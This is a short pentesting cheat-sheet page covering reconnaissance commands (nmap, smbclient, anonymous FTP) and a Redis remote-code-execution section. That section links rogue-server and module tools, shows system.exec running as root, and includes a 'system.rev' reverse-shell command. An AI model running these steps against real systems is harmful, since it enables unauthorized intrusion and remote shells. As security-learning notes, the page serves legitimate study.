---
layout: default
title: Information Gathering
nav_order: 2
has_children: false
parent: Pentesting
grand_parent: xMAD0X Shiny Adventure
---

## Information Gathering

###  NMAP :
#### TCP : 
```sh
nmap -Pn -n -p- --min-rate 4000 --open -sCV $IP
```

#### UDP :
```sh
nmap $IP -sU --min-rate=1000 -sC -sV
```


### SMB (445): 

#### List share : 
```sh
smbclient -L $IP
```

#### Connect to share : 
```sh
smbclient //$IP/$SHARE_NAME
```

### FTP (21): 

#### Anonymous access : 
```sh
ftp $IP
Connected to $IP.
220 (vsFTPd 3.0.2)
Name ($IP:mad0x): anonymous
331 Please specify the password.
Password: (NONE)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive //if not already on
Passive mode: on; fallback to active mode: on.
```

### Redis (6379): 
#### Interract :
```bash
redis-cli -h $IP
```

#### RCE :

##### Interractive Shell 
The following tool might help to get an access to the instance :  [https://github.com/n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)


##### Load Redis Module

The following link provide information regarding the redis module loading : [https://github.com/n0b0dyCN/RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)

**Load the module** has to be loaded so a write folder is needed. 

**Load the uploaded module** at runtime with `MODULE LOAD /path/to/mymodule.so`

**List loaded modules** to check it was correctly loaded: `MODULE LIST`

**Execute** **commands**:

```sh
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
127.0.0.1:6379> system.exec "whoami"
"root\n"
127.0.0.1:6379> system.rev 127.0.0.1 9999
```

**Unload the module** whenever you want: `MODULE UNLOAD mymodule`